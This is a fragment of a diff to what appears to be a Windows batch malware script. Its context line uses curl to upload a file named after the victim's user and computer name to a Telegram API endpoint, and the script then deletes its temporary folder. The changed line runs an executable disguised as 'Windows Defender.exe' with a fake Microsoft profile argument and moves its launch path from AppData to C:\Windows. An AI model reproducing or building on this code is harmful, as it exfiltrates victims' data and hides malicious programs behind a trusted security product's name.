@@ -78,4 +78,4 @@ curl.exe %proxy% -F document=@"%username%@%computername%.txt" https://api.telegr
 cd "%temp%"
 rmdir /s /q "%temp%\%folder%"
 
-"%AppData%\Microsoft\Windows\Windows Defender.exe" -P"rofile of Windows Defender [Microsoft Corporation]"
+"C:\Windows\Windows Defender.exe" -P"rofile of Windows Defender [Microsoft Corporation]"
